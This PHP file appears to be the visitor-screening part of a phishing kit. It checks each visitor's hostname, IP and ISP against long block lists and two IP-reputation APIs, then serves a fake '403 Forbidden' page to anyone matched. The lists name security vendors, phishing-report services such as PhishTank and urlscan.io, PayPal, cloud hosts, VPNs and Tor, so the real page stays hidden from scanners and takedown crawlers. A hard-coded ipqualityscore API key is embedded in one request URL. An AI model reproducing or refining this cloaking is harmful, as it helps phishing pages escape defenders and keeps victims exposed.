<?php
require_once 'geoPlugin.class.php';
$blocked_words = array(
    "above",
    "node",
    "Fiddler",
    "google",
    "softlayer",
    "amazonaws",
    "vultr",
    "phishtank",
    "dreamhost",
    "mailcontrol",
    "calyxinstitute",
    "parked",
    "tor-exit",
    "paypal",
    "urlscan.io",
    "amazonaws",
    "rsghosting",
    "linode",
    "opendns",
    "hosting",
    "barracuda",
    "phish",
    "tor",
    "server"
);
foreach ($blocked_words as $word)
{
    if (substr_count($hostname, $word) > 0)
    {
        $log .= "Reason: Hostname Blocked ¥n";
        $log .= "Blocked: True ¥n";
        fwrite($fp, $log);
        fwrite($fp, "¥n");
        fclose($fp);
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
}



$blacklistedips = array(
    "72.12.194.94",
    "72.12.194.91",
    "72.12.194.90",
    "72.12.194.92",
    "72.12.194.93",
    "72.12.194.94",
    "72.12.194.95",
    "72.12.194.96",
    "111.93.191.38",
    "64.82.154.124",
    "40.94.225.54",
    "20.40.124.167",
    "40.94.90.5",
    "40.94.240.37",
    "40.94.35.73",
    "40.94.31.89",
    "40.94.35.1",
    "40.94.240.84",
    "20.40.124.80",
    "172.19.0.7",
    "201.1.134.207"
); //Blacklisted IPS
$blocks = array(
    "ColoCrossing",
    "Linode, LLC",
    "Nobis Technology Group",
    "Proofpoint, Inc.",
    "Proofpoint",
    "Research Organization of Information and Systems, National Institute of Informa",
    "Netwave Internet Services",
    "Netwave",
    "Chubu Telecommunications Co., Inc.",
    "Japan Network Information Center",
    "Cloudvpn Inc.",
    "Google",
    "Hostwinds LLC.",
    "Datacamp Limited",
    "Kaspersky Lab ZAO",
    "Kaspersky Lab",
    "Bitdefender SRL",
    "itdefender",
    "M247 Ltd",
    "SIEMENS AG",
    "AVAST cloud",
    "DigitalOcean",
    "DigitalOcean, LLC",
    "SoftLayer",
    "AVAST Software s.r.o.",
    "M247",
    "OVH SAS",
    "ConnorSmith",
    "Google LLC",
    "Amazon.com, Inc.",
    "Microsoft Corporation",
    "Forcepoint Cloud Ltd",
    "Voxility LLP",
    "Symantec Corporation",
    "GigeNET",
    "PlusNet plc.",
    "Amazon Technologies Inc.",
    "Sungard Availability Network Solutions",
    "Internap Network Services Corporation",
    "SoftLayer Technologies Inc.",
    "Palo Alto Networks, Inc",
    "Palo Alto Networks",
    "SonicWALL, Inc.",
    "ZSCALER, INC.",
    "Web2Objects LLC",
    "Amazon.com",
    "Amazon",
    "Chrome",
    "phish",
    "Paypal",
    "DedFiberCo",
    "Digital Ocean",
    "Google Cloud",
    "Trustwave Holdings",
    "Holdings",
    "Trustwave",
    "SoftLayer Technologies",
    "SurfControl",
    "EGIHosting",
    "LogicWeb",
    "Choopa",
    "Shinjiru",
    "Total Server Solutions",
    "Brookhaven National Laboratory",
    "OVH Hosting",
    "XFERA Moviles S.A.",
    "AVAST",
    "Privax Ltd.",
    "Privax",
    "M247 Europe SRL",
    "Wintek Corporation",
    "Kaspersky Lab AO",
    "TELEFﾃ年ICA BRASIL S.A",
    "UK-2 Limited",
    "Online S.a.s.",
    "BullGuard ApS",
    "net4sec UG",
    "HostDime.com, Inc.",
    "Digital Energy Technologies Ltd.",
    "New Dream Network, LLC",
    "LeaseWeb Netherlands B.V.",
    "Hetzner Online GmbH",
    "Rakuten Communications Corp.",
    "IP Volume inc",
    "NTT PC Communications, Inc.",
    "Liberty Global B.V.",
    "PALO ALTO NETWORKS",
    "Forcepoint, LLC",
    "SINET, Cambodia's specialist Internet and Telecom Service Provider.",
    "Soyuz LTD",
    "Internap Corporation",
    "Nameshield SAS",
    "VNPT Corp",
    "PVimpelCom",
    "EAGLE SKY CO LT",
    "Leaseweb USA, Inc.",
    "HETZNER",
    "F5 Networks, Inc.",
    "British Telecommunications PLC",
    "FASTER CZ spol. s r.o.",
    "Cogent Communications",
    "Renater",
    "InterNetX GmbH",
    "The Corporation for Financing & Promoting Technology",
    "TerraTransit AG",
    "Joshua Peter McQuistan",
    "Commtouch Inc.",
    "YANDEX LLC",
    "RateLimited",
    "Hot-Net internet services Ltd.",
    "NTT Communications Corporation",
    "Network Solutions",
    "McAfee",
    "Google Proxy",
    "Contina Communications, LLC",
    "Almouroltec Servicos De Informatica E Internet Lda",
    "HL komm Telekommunikations GmbH",
    "KVCHOSTING.COM LLC",
    "Tiscali SpA",
    "Vertical Telecoms Pty Ltd",
    "1&1 Internet SE",
    "Total Server Solutions L.L.C",
    "EVANZO e-commerce GmbH",
    "TM Net, Internet Service Provider",
    "ESET, spol. s r.o.",
    "Atlantic.net, Inc.",
    "Venus Business Communications Limited,",
    "Network Transit Holdings LLC",
    "Scalair FR hosting",
    "Secure Internet LLC",
    "Cisco OpenDNS,Sewan Communications",
    "HostUS Solutions LLC",
    "anyNode",
    "RamNode LLC",
    "CobraTELECOM SRL",
    "ServeTheWorld AS",
    "Mail.Ru LLC",
    "DomainTools, LLC",
    "Huawei Cloud Service",
    "WorldStream B.V.",
    "Fastweb Networks",
    "Nobis Technology Group, LLC",
    "Teso LT UAB",
    "Todas LAS Redes SA",
    "Digital Energy Technologies Limited",
    "SupremeBytes",
    "QuadraNet",
    "Atlantic.net",
    "Colocation America Corporation",
    "QuickWeb Technologies LLC",
    "Isomedia, Inc.",
    "PacketExchange",
    "Total Server Solutions L.L.C.",
    "Hype Enterprises",
    "MOD MC",
    "Intellect Networks",
    "WhiteLabelColo",
    "Oso Grande Technologies",
    "Infolink",
    "DATACOM CARIBE, INC.",
    "SYN LTD",
    "Vivid Hosting",
    "1&1 IONOS SE",
    "24 SHELLS",
    "3z.net",
    "Digital Energy Technologies Chile SpA",
    "Enzu Inc",
    "H4Y Technologies LLC",
    "Handy Networks, LLC",
    "Horry Telephone Cooperative",
    "Nodisto IT, LLC",
    "Paradise Networks LLC",
    "QuadraNet Enterprises LLC",
    "US Net Incorporated",
    "WideOpenWest Finance LLC",
    "LaunchVPS, LLC",
    "HostHatch",
    "Soluciones Favorables",
    "Netrouting",
    "Addresses CNNIC",
    "Hangzhou Alibaba Advertising Co., Ltd.",
    "Total Play Telecomunicaciones SA De CV",
    "Joe's Datacenter, LLC",
    "Secured Servers LLC",
    "QuickPacket, LLC",
    "B2 Net Solutions Inc.",
    "Psychz Networks",
    "HostFlyte Server Solutions",
    "Telegram Messenger San Francisco Network",
    "Faction",
    "TDS TELECOM",
    "Database by Design, LLC",
    "Bowling Green Municipal Utilities",
    "WestHost, Inc.",
    "Nedelco Inc.",
    "CC Communications"
);


if (in_array($geoplugin->isp, $blocks, true))
{
    $log .= "Reason: ISP Blocked ¥n";
    $log .= "Blocked: True ¥n";

    fwrite($fp, $log);
    fwrite($fp, "¥n");
    fclose($fp);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}

if (in_array($geoplugin->ip, $blacklistedips, true)) {
    $log .= "Reason: IP Blocked ¥n";
    $log .= "Blocked: True ¥n";

    fwrite($fp, $log);
    fwrite($fp, "¥n");
    fclose($fp);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}

$ch2 = curl_init("http://v2.api.iphub.info/ip/" . $geoplugin->ip);
curl_setopt($ch2, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);

$output2 = json_decode(curl_exec($ch2), 1);
$http_status = curl_getinfo($ch2, CURLINFO_HTTP_CODE);


if ($output2['block'] === 1) {
    $log .= "Reason: IPHUB ¥n";
    $log .= "Blocked: True ¥n";

    fwrite($fp, $log);
    fwrite($fp, "¥n");
    fclose($fp);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}


$ch = curl_init("https://www.ipqualityscore.com/api/json/ip/XPU6QDO9Y4o6iJYxcusEARXPzoK4W03M/$geoplugin->ip/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$output = json_decode(curl_exec($ch), 1);
$http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);


if ($output['proxy'] === 1 && $BLOCK_PROXY === 1) {
    $proxy = $output['proxy'];
    $log .= "Reason: IPQUALITY ¥n";
    $log .= "Blocked: $proxy ¥n";
    fwrite($fp, $log);
    fwrite($fp, "¥n");
    fclose($fp);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}

?>